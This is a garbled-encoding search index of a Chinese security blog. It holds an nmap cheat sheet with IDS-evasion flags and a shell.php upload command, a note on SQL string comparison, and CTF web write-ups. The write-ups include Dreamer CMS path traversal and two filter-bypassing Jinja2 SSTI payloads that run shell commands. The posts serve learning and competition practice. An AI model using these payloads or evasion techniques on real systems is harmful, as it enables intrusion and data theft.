<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ¸—é€å·¥å…·å­¦ä¹ </title>
      <link href="/2023/07/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/07/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åŸºæœ¬æ‰«æ</span></span><br><span class="line">nmap [IP] # æ‰«æä¸€ä¸ªä¸»æœº</span><br><span class="line">nmap -Pn [IP] # æ‰«æä¸€ä¸ªä¸»æœºå¦‚æœæ— æ³•pingé€šä¹Ÿç»§ç»­æ‰«æ</span><br><span class="line">nmap [ç½‘ç»œåœ°å€/å­ç½‘å‰ç¼€é•¿åº¦] # æ‰«æä¸€ä¸ªCIDRåœ°å€</span><br><span class="line">nmap [-iL] hosts.txt # æ‰«ææ–‡ä»¶å†…çš„æ‰€æœ‰ä¸»æœº</span><br><span class="line">nmap 192.168.1.1-10 # æ‰«æä¸€ä¸ªIPèŒƒå›´å†…çš„</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŒ‡å®šç«¯å£</span></span><br><span class="line">nmap -p [ç«¯å£å·] [IP] # æ‰«ææŸä¸ªç«¯å£</span><br><span class="line">nmap -p [ç«¯å£å·-ç«¯å£å·] [IP] # æ‰«ææŸä¸ªåŒºé—´ç«¯å£</span><br><span class="line">nmap -p [ç«¯å£å·,..] [IP] # æ‰«ææŸä¸ªç‰¹å®šç«¯å£</span><br><span class="line">nmap -p- www.example.com # æ‰«ææ‰€æœ‰ç«¯å£</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŒ‡å®šæ‰«æç±»å‹</span></span><br><span class="line">TCP SYNæ‰«æï¼ˆé»˜è®¤ï¼‰ï¼šä½¿ç”¨TCP SYNåŒ…æ¢æµ‹ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ã€‚ä½¿ç”¨-sSé€‰é¡¹æŒ‡å®šã€‚</span><br><span class="line">nmap -sS www.example.com</span><br><span class="line">TCP è¿æ¥æ‰«æï¼šä½¿ç”¨TCPè¿æ¥æ¢æµ‹ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ã€‚ä½¿ç”¨-sTé€‰é¡¹æŒ‡å®šã€‚</span><br><span class="line">nmap -sT www.example.com</span><br><span class="line">UDP æ‰«æï¼šæ¢æµ‹ä¸»æœºä¸Šçš„å¼€æ”¾UDPç«¯å£ã€‚ä½¿ç”¨-sUé€‰é¡¹æŒ‡å®šã€‚--top-ports &lt;number&gt; æœ€å¸¸ç”¨çš„UDPç«¯å£</span><br><span class="line">nmap -sU www.example.com </span><br><span class="line">nmap -sU --top-ports 20 &lt;target&gt; .å°†æ‰«æå‰ 20 ä¸ªæœ€å¸¸ç”¨çš„ UDP ç«¯å£ï¼Œä»è€Œè·å¾—æ›´å¯æ¥å—çš„æ‰«ææ—¶é—´ã€‚</span><br><span class="line">æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼šå°è¯•è¯†åˆ«ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬ã€‚ä½¿ç”¨-Oé€‰é¡¹æŒ‡å®šã€‚</span><br><span class="line">nmap -O www.example.com</span><br><span class="line">ç‰ˆæœ¬æ£€æµ‹ï¼šå°è¯•è¯†åˆ«ä¸»æœºä¸Šè¿è¡Œçš„æœåŠ¡åŠå…¶ç‰ˆæœ¬ã€‚ä½¿ç”¨-sVé€‰é¡¹æŒ‡å®šã€‚</span><br><span class="line">nmap -sV www.example.com</span><br><span class="line">å…¨é¢æ‰«æï¼šç»“åˆTCP SYNæ‰«æã€TCPè¿æ¥æ‰«æã€UDPæ‰«æã€æ“ä½œç³»ç»Ÿæ£€æµ‹å’Œç‰ˆæœ¬æ£€æµ‹è¿›è¡Œå…¨é¢æ‰«æã€‚ä½¿ç”¨-sS -sT -sU -O -sVé€‰é¡¹æŒ‡å®šã€‚</span><br><span class="line">nmap -sS -sT -sU -O -sV www.example.com</span><br><span class="line">TCP Null Scans TCP ç©ºæ‰«æ </span><br><span class="line">-sN</span><br><span class="line">TCP FIN Scans </span><br><span class="line">-sF</span><br><span class="line">TCP Xmas Scans </span><br><span class="line">-sX</span><br><span class="line">pingæ‰«æ</span><br><span class="line">-sn</span><br><span class="line">å¢åŠ ä¿¡æ¯</span><br><span class="line">nmap -v www.example.com</span><br><span class="line">nmap -vv www.example.com # äºŒçº§</span><br><span class="line">aggressive ä¾µç•¥æ¨¡å¼</span><br><span class="line">nmap -A www.example.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŒ‡å®šæ‰«æé€Ÿåº¦</span></span><br><span class="line">-T0ï¼šéå¸¸æ…¢çš„é€Ÿåº¦</span><br><span class="line">-T1ï¼šæ…¢é€Ÿ</span><br><span class="line">-T2ï¼šæ­£å¸¸é€Ÿåº¦</span><br><span class="line">-T3ï¼šå¿«é€Ÿ</span><br><span class="line">-T4ï¼šéå¸¸å¿«çš„é€Ÿåº¦</span><br><span class="line">-T5ï¼šæå¿«çš„é€Ÿåº¦</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¾“å‡ºæ‰«æç»“æœ</span></span><br><span class="line">-oA &lt;file&gt;: ä¸‰ç§æ ¼å¼æ–‡ä»¶</span><br><span class="line">-oN &lt;file&gt;ï¼šå°†æ‰«æç»“æœä¿å­˜ä¸ºæ™®é€šæ–‡æœ¬æ–‡ä»¶</span><br><span class="line">-oX &lt;file&gt;ï¼šå°†æ‰«æç»“æœä¿å­˜ä¸ºXMLæ–‡ä»¶</span><br><span class="line">-oG &lt;file&gt;ï¼šå°†æ‰«æç»“æœä¿å­˜ä¸ºå¯è¯»æ€§æ›´å¥½çš„æ ¼å¼</span><br><span class="line">nmap -oA example_scan www.example.com # è¿™å°†åœ¨å½“å‰ç›®å½•ä¸­åˆ›å»ºä¸‰ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶ååˆ†åˆ«ä¸ºï¼šxample_scan.nmapï¼šæ™®é€šæ ¼å¼ example_scan.xmlï¼šXMLæ ¼å¼ example_scan.gnmapï¼šå¯grepæ ¼å¼</span><br><span class="line">nmap -oN result.txt www.example.com  # å°†æ‰«æç»“æœä¿å­˜ä¸ºæ™®é€šæ–‡æœ¬æ–‡ä»¶</span><br><span class="line">nmap -oX result.xml www.example.com  # å°†æ‰«æç»“æœä¿å­˜ä¸ºXMLæ–‡ä»¶</span><br><span class="line">nmap -oG result.txt www.example.com  # å°†æ‰«æç»“æœä¿å­˜ä¸ºå¯è¯»æ€§æ›´å¥½çš„æ ¼å¼</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä½¿ç”¨è„šæœ¬</span></span><br><span class="line">è¦ä»nmapè„šæœ¬åº“ä¸­æ¿€æ´»ä¸€ä¸ªè„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨--scripté€‰é¡¹ï¼Œåè·Ÿè¦æ¿€æ´»çš„è„šæœ¬åç§°ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°†æ¿€æ´»http-titleè„šæœ¬ï¼Œè¯¥è„šæœ¬å¯ç”¨äºæå–ç›®æ ‡WebæœåŠ¡å™¨çš„æ ‡é¢˜ï¼š</span><br><span class="line">nmap --script=http-title www.example.com</span><br><span class="line">æ‚¨è¿˜å¯ä»¥ä½¿ç”¨é€—å·åˆ†éš”çš„åˆ—è¡¨æ¥æ¿€æ´»å¤šä¸ªè„šæœ¬ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°†æ¿€æ´»http-titleå’Œhttp-headersè„šæœ¬ï¼š</span><br><span class="line">nmap --script=http-title,http-headers www.example.com</span><br><span class="line">å¦‚æœæ‚¨æƒ³è¦æ¿€æ´»æ‰€æœ‰è„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ --script=all é€‰é¡¹ã€‚è¿™å°†æ¿€æ´»nmapè„šæœ¬åº“ä¸­çš„æ‰€æœ‰è„šæœ¬ï¼Œä½†å¯èƒ½ä¼šå¯¼è‡´æ‰«ææ—¶é—´å˜é•¿ã€‚</span><br><span class="line">nmap --script=all www.example.com</span><br><span class="line">ä»¥ä¸‹å‘½ä»¤å°†æ¿€æ´»æ‰€æœ‰&quot;vuln&quot;ç±»åˆ«ä¸­çš„è„šæœ¬ï¼Œå¹¶å¯¹www.example.comè¿›è¡Œæ‰«æï¼š</span><br><span class="line">nmap --script=vuln www.example.com</span><br><span class="line">è„šæœ¬åº“</span><br><span class="line">safe ï¼š- ä¸ä¼šå½±å“ç›®æ ‡</span><br><span class="line">intrusive ï¼š- ä¸å®‰å…¨ï¼šå¯èƒ½ä¼šå½±å“ç›®æ ‡</span><br><span class="line">vuln ï¼š- æ‰«ææ¼æ´</span><br><span class="line">exploit ï¼š- å°è¯•åˆ©ç”¨æ¼æ´</span><br><span class="line">auth ï¼š- å°è¯•ç»•è¿‡æ­£åœ¨è¿è¡ŒæœåŠ¡çš„èº«ä»½éªŒè¯ï¼ˆä¾‹å¦‚åŒ¿åç™»å½•FTPæœåŠ¡å™¨ï¼‰</span><br><span class="line">brute ï¼š- å°è¯•æš´åŠ›ç ´è§£æ­£åœ¨è¿è¡ŒæœåŠ¡çš„å‡­æ®</span><br><span class="line">discovery ï¼š- å°è¯•æŸ¥è¯¢æ­£åœ¨è¿è¡Œçš„æœåŠ¡ä»¥è·å–æœ‰å…³ç½‘ç»œçš„æ›´å¤šä¿¡æ¯ï¼ˆä¾‹å¦‚æŸ¥è¯¢ SNMP æœåŠ¡å™¨ï¼‰ã€‚</span><br><span class="line">https://nmap.org/book/nse-usage.html</span><br><span class="line">æŸäº›è„šæœ¬éœ€è¦å‚æ•°ï¼ˆä¾‹å¦‚ï¼Œå‡­æ®ï¼Œå¦‚æœå®ƒä»¬æ­£åœ¨åˆ©ç”¨ç»è¿‡èº«ä»½éªŒè¯çš„æ¼æ´ï¼‰ã€‚è¿™äº›å¯ä»¥é€šè¿‡ --script-args Nmapå¼€å…³æä¾›ã€‚è¿™æ–¹é¢çš„ä¸€ä¸ªä¾‹å­æ˜¯ http-put è„šæœ¬ï¼ˆç”¨äºä½¿ç”¨ PUT æ–¹æ³•ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚è¿™éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼šè¦å°†æ–‡ä»¶ä¸Šä¼ åˆ°çš„ URL å’Œæ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„ä½ç½®ã€‚ä¾‹å¦‚ï¼š</span><br><span class="line">nmap -p 80 --script http-put --script-args http-put.url=&#x27;/dav/shell.php&#x27;,http-put.file=&#x27;./shell.php&#x27;</span><br></pre></td></tr></table></figure><h3 id="æœç´¢NSEè„šæœ¬"><a href="#æœç´¢NSEè„šæœ¬" class="headerlink" title="æœç´¢NSEè„šæœ¬"></a>æœç´¢NSEè„šæœ¬</h3><p><code>grep &quot;&#123;è„šæœ¬åå­—&#125;&quot; /usr/share/nmap/scripts/script.db</code></p><h3 id="é˜²ç«å¢™è§„é¿"><a href="#é˜²ç«å¢™è§„é¿" class="headerlink" title="é˜²ç«å¢™è§„é¿"></a>é˜²ç«å¢™è§„é¿</h3><p><code>-f</code> ï¼š- ç”¨äºå¯¹æ•°æ®åŒ…è¿›è¡Œåˆ†æ®µï¼ˆå³å°†å®ƒä»¬åˆ†æˆæ›´å°çš„éƒ¨åˆ†ï¼‰ï¼Œä½¿é˜²ç«å¢™æˆ– IDS ä¸å¤ªå¯èƒ½æ£€æµ‹åˆ°æ•°æ®åŒ…ã€‚</p><p><code>-f</code> æ›¿ä»£æ–¹æ³•ï¼Œä½†å¯ä»¥æ›´å¥½åœ°æ§åˆ¶æ•°æ®åŒ…çš„å¤§å°ï¼š <code>--mtu &lt;number&gt;</code> ï¼Œæ¥å—ç”¨äºå‘é€çš„æ•°æ®åŒ…çš„æœ€å¤§ä¼ è¾“å•å…ƒå¤§å°ã€‚è¿™å¿…é¡»æ˜¯ 8 çš„å€æ•°ã€‚</p><p><code>--scan-delay &lt;time&gt;ms</code> ï¼š- ç”¨äºåœ¨å‘é€çš„æ•°æ®åŒ…ä¹‹é—´æ·»åŠ å»¶è¿Ÿã€‚å¦‚æœç½‘ç»œä¸ç¨³å®šï¼Œè¿™éå¸¸æœ‰ç”¨ï¼Œä½†å¯¹äºè§„é¿å¯èƒ½å­˜åœ¨çš„ä»»ä½•åŸºäºæ—¶é—´çš„é˜²ç«å¢™/ IDSè§¦å‘å™¨ä¹Ÿéå¸¸æœ‰ç”¨ã€‚</p><p><code>--badsum</code> ï¼š- è¿™ç”¨äºç”Ÿæˆæ— æ•ˆçš„æ•°æ®åŒ…æ ¡éªŒå’Œã€‚ä»»ä½•çœŸæ­£çš„TCP / IPå †æ ˆéƒ½ä¼šä¸¢å¼ƒæ­¤æ•°æ®åŒ…ï¼Œä½†æ˜¯ï¼Œé˜²ç«å¢™å¯èƒ½ä¼šè‡ªåŠ¨å“åº”ï¼Œè€Œæ— éœ€è´¹å¿ƒæ£€æŸ¥æ•°æ®åŒ…çš„æ ¡éªŒå’Œã€‚å› æ­¤ï¼Œæ­¤å¼€å…³å¯ç”¨äºç¡®å®šæ˜¯å¦å­˜åœ¨é˜²ç«å¢™/IDSã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºsqlçš„ä¸€äº›ç†è§£</title>
      <link href="/2023/04/25/%E5%85%B3%E4%BA%8Esql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
      <url>/2023/04/25/%E5%85%B3%E4%BA%8Esql%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlæ³¨å…¥é‚£äº›äº‹"><a href="#sqlæ³¨å…¥é‚£äº›äº‹" class="headerlink" title="sqlæ³¨å…¥é‚£äº›äº‹"></a>sqlæ³¨å…¥é‚£äº›äº‹</h2><p>å…³äºä¸ºä»€ä¹ˆ select * from user where â€˜a1â€™ = â€˜e1â€™ = â€˜1â€™; å’Œ select * from user where â€˜1â€™=â€™a1â€™ = â€˜e1â€™;æŸ¥è¯¢å‡ºæ¥sqlçš„å€¼ä¸ä¸€æ ·</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230425230152933.png" alt="image-20230425230152933"></p><blockquote><p>é¦–å…ˆè¿™é‡Œè¯´ä¸€ç‚¹ï¼Œsqlå­—ç¬¦ä¸²å…·æœ‰è·Ÿphpå­—ç¬¦ä¸²ç±»ä¼¼çš„æ€§è´¨ï¼Œæ¯”å¦‚è¯´ï¼Œå¦‚æœæ˜¯ä»¥éæ•°å­—å¼€å¤´çš„</p><p>ä¾‹å¦‚: <code>&#39;qdadada&#39; &#39;adad&#39;</code> è¿™äº›å­—ç¬¦ä¸²çš„é€»è¾‘å€¼ä¸º<code>0</code></p><p>å¦‚æœæ˜¯ä»¥æ•°å­—å¼€å¤´çš„</p><p>ä¾‹å¦‚: <code>&#39;1aaaa&#39; &#39;2bbb&#39;</code> è¿™äº›å­—ç¬¦ä¸²çš„é€»è¾‘å€¼ä¸º<code>1</code></p></blockquote><h3 id="39-a1-39-39-e1-39-39-1-39-å’Œ-39-1-39-39-a1-39-39-e1-39-çš„åŒºåˆ«"><a href="#39-a1-39-39-e1-39-39-1-39-å’Œ-39-1-39-39-a1-39-39-e1-39-çš„åŒºåˆ«" class="headerlink" title="&#39;a1&#39; = &#39;e1&#39; = &#39;1&#39; å’Œ &#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;çš„åŒºåˆ«"></a><code>&#39;a1&#39; = &#39;e1&#39; = &#39;1&#39;</code> å’Œ<code> &#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;</code>çš„åŒºåˆ«</h3><ul><li>æ‰§è¡Œé¡ºåºä¸åŒï¼Œé€ æˆæ‰§è¡Œç»“æœæˆªç„¶ä¸åŒã€‚</li></ul><h4 id="39-a1-39-39-e1-39-39-1-39"><a href="#39-a1-39-39-e1-39-39-1-39" class="headerlink" title="&#39;a1&#39;= &#39;e1&#39; = &#39;1&#39;"></a><code>&#39;a1&#39;= &#39;e1&#39; = &#39;1&#39;</code></h4><ol><li>é¦–å…ˆ <code>&#39;a1&#39; = &#39;e1&#39;</code>å› ä¸ºæ˜¯å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ‰€ä»¥è¿”å›false</li><li>è¡¨è¾¾å¼å°±å˜æˆäº† <code>false = &#39;1&#39;</code> </li><li><code>&#39;1&#39;</code>çš„é€»è¾‘å€¼ä¸º 1</li></ol><p>æ‰€ä»¥<code>false = &#39;1&#39;</code>è¿”å›äº†false</p><h4 id="39-1-39-39-a1-39-39-e1-39"><a href="#39-1-39-39-a1-39-39-e1-39" class="headerlink" title="&#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;"></a><code>&#39;1&#39; = &#39;a1&#39;= &#39;e1&#39;</code></h4><ol><li>é¦–å…ˆ <code>&#39;1&#39; = &#39;e1&#39;</code>æ˜¯å­—ç¬¦ä¸²æ¯”è¾ƒ è¿”å› fasle</li><li>æ‰€ä»¥è¡¨è¾¾å¼å˜æˆäº† <code>false = &#39;e1&#39;</code></li><li><code>&#39;e1&#39;</code>çš„é€»è¾‘å€¼ä¸º0</li></ol><p>æ‰€ä»¥æœ€ç»ˆä¸º false = â€˜e1â€™ è¿”å›äº†true</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·æ¯-web-wp</title>
      <link href="/2023/04/20/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-web-wp/"/>
      <url>/2023/04/20/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-web-wp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ²¡dockerç¯å¢ƒï¼Œèµ›åä¸å¥½å†™wpï¼Œæ¯”èµ›æ—¶å€™å¿˜è®°å†™wpäº†</p></blockquote><p>[TOC]</p><h2 id="ç‚¹å‡»ç­¾åˆ°"><a href="#ç‚¹å‡»ç­¾åˆ°" class="headerlink" title="ç‚¹å‡»ç­¾åˆ°"></a>ç‚¹å‡»ç­¾åˆ°</h2><p>æŠŠå˜é‡å­—ç¬¦ä¸²æ”¹çŸ­ï¼Œç„¶åæ­åˆ°æœ¬åœ°ç¯å¢ƒå°±å¥½äº†ï¼Œç„¶åç‚¹å‡»ä¸‹</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204105304.png" alt="image-20230420204105304"></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204217900.png" alt="image-20230420204217900"></p><h2 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a>Dreamer</h2><p>é¦–å…ˆä¸‹è½½ç»™çš„æºç ï¼Œæºç é‡Œé¢æœ‰åå°ç®¡ç†å‘˜çš„ç™»å½•è´¦å·å’Œå¯†ç ã€‚</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204407015.png" alt="image-20230420204407015"></p><p>ç„¶ååˆ°é¡¹ç›®æºç é‡Œé¢æ‰¾åˆ°ä¸»é¢˜æºç ä½ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src\main\resources\db\dreamer-cms\templates</span><br></pre></td></tr></table></figure><p>éšä¾¿ä¸€ä¸ªä¸»é¢˜æ‰¾åˆ°<code>theme.json</code>æŠŠ<code>themepath</code>å¯¹åº”çš„å€¼æ”¹æˆ<code>../../../../../../../../../../../../../../</code></p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230420204642439.png" alt="image-20230420204642439"></p><p>ç„¶åä¸Šä¼ ä¸»é¢˜åŒ…åˆ°åå°ç®¡ç†çš„<code>é£æ ¼ç®¡ç†</code>é¡µé¢ï¼Œ</p><p><img src="https://foruda.gitee.com/images/1678954524753194744/7480eb3d_8686450.png" alt="è¾“å…¥å›¾ç‰‡è¯´æ˜"></p><p>ç„¶ååœ¨<code>æ¨¡æ¿ç®¡ç†</code>é‡Œé¢å°±å¯ä»¥éå†ä»»æ„æ–‡ä»¶æ‹¿åˆ°flagäº†ã€‚ä¸å¤Ÿæˆ‘æ²¡æœ‰getshellï¼Œå¯èƒ½æ˜¯ç¯å¢ƒæ²¡æœ‰å®šæ—¶ä»»åŠ¡</p><p><a href="https://gitee.com/isoftforce/dreamer_cms/issues/I6NP86">ğŸ›¡ï¸ åå°æ¨¡æ¿ç®¡ç†å¯ä»¥ä»»æ„ç¼–è¾‘å¯¼è‡´GetShell Â· Issue #I6NP86 Â· ç‹ä¿Šå—/Dreamer CMSï¼ˆæ¢¦æƒ³å®¶CMSå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰ - Gitee.com</a></p><h2 id="Dreamer-revenge"><a href="#Dreamer-revenge" class="headerlink" title="Dreamer_revenge"></a>Dreamer_revenge</h2><p>åŒä¸Šï¼Œåªæœ‰æœ€åä¸€æ­¥ä¸ä¸€æ ·ã€‚</p><p>è¯»å–/proc/1/environçš„å†…å®¹å¯ä»¥æ‹¿åˆ°flagï¼Œ</p><p><a href="https://blog.csdn.net/m0_47696151/article/details/121947320"> è§£æ linux è¿›ç¨‹ pid 0, pid 1, pid 2 å…³ç³»åŠå¯åŠ¨è¿‡ç¨‹_pidä¸º0çš„è¿›ç¨‹_lylhw13_çš„åšå®¢-CSDNåšå®¢</a></p><p>é¦–å…ˆæ¨æµ‹flagåœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œå› ä¸ºè¿™ä¸ªé¢˜ç›®æ ¹ç›®å½•æ²¡flagï¼Œç„¶åæ¨æµ‹æ˜¯dockerç¯å¢ƒåœ¨åˆ›å»ºçš„æ—¶å€™åŒæ—¶è®¾ç½®åˆ°flagï¼Œæ‰€ä»¥åœ¨pid1é‡Œé¢å¯»æ‰¾flag</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDOUCTFâ€”web-wp</title>
      <link href="/2023/04/20/GDOUCTF%E2%80%94web-wp/"/>
      <url>/2023/04/20/GDOUCTF%E2%80%94web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="ez-ze"><a href="#ez-ze" class="headerlink" title="ez_ze"></a>ez_ze</h2><blockquote><p>SSTIè¢«è¿‡æ»¤<code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; `  `&#125;&#125;</code> ç»•è¿‡æ–¹æ³•ã€‚</p></blockquote><p>FUZZè·‘ä¸€ä¸‹æµ‹å‡ºæ¥è¿‡æ»¤äº†ä¸‹åˆ—å­—ç¬¦</p><p><code>.</code> <code>[</code>  <code>]</code> <code> _</code>  <code>\</code> <code>&#123;&#123; `   `&#125;&#125;</code></p><p>è¿™ä¸ªé¢˜ç›®å¦‚æœæ²¡æœ‰è¿‡æ»¤<code>\</code>å°±å¯ä»¥ç”¨unicodeç¼–ç ä¹‹ç±»çš„ç»•è¿‡ï¼Œä½†æ˜¯è¿‡æ»¤äº†<code>\</code>æ‰€ä»¥ä¸èƒ½ç”¨unicodeï¼Œ</p><p>payload1:</p><p>é‡‡ç”¨ jinja2çš„è¿‡æ»¤å™¨attrå’Œformat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(&#x27;&#x27;|attr(&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c&#x27;|format(95,95,109,114,111,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(1)|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,115,117,98,99,108,97,115,115,101,115,95,95))()|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(132)|attr(&#x27;%c%c%c%c%c%c%c%c&#x27;|format(95,95,105,110,105,116,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,108,111,98,97,108,115,95,95))|attr(&#x27;%c%c%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,103,101,116,105,116,101,109,95,95))(&#x27;%c%c%c%c%c&#x27;|format(112,111,112,101,110))(&#x27;cat /f*&#x27;)|attr(&#x27;read&#x27;)())%&#125;</span><br></pre></td></tr></table></figure><p>payload2:</p><p>é‡‡ç”¨jinja2çš„è¿‡æ»¤å™¨attrå’Œåˆ©ç”¨ flaskçš„requestæ–¹æ³•æ¥è¿›è¡Œè·å–<code>__</code> (ä¸‹é¢çš„payloadè¦ç”¨burpsuiteï¼Œä¸ç„¶è¢«urlç¼–ç ä»¥åå°±ä¼šå¤±æ•ˆ)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /get_flag?__</span><br><span class="line">&#123;% for c in request|attr(&#x27;args&#x27;) %&#125;&#123;%print(&#x27;&#x27;|attr(c%2b&#x27;cla&#x27;&#x27;ss&#x27;%2bc)|attr(c%2b&#x27;ba&#x27;&#x27;se&#x27;%2bc)|attr(c%2b&#x27;subcl&#x27;&#x27;asses&#x27;%2bc)()|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(132)|attr(c%2b&#x27;in&#x27;&#x27;it&#x27;%2bc)|attr(c%2b&#x27;glob&#x27;&#x27;als&#x27;%2bc)|attr(c%2b&#x27;get&#x27;&#x27;item&#x27;%2bc)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;cat /flag&#x27;)|attr(&#x27;read&#x27;)()) %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOWæ„šäººæ¯-web</title>
      <link href="/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/"/>
      <url>/2023/04/08/CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF-web/</url>
      
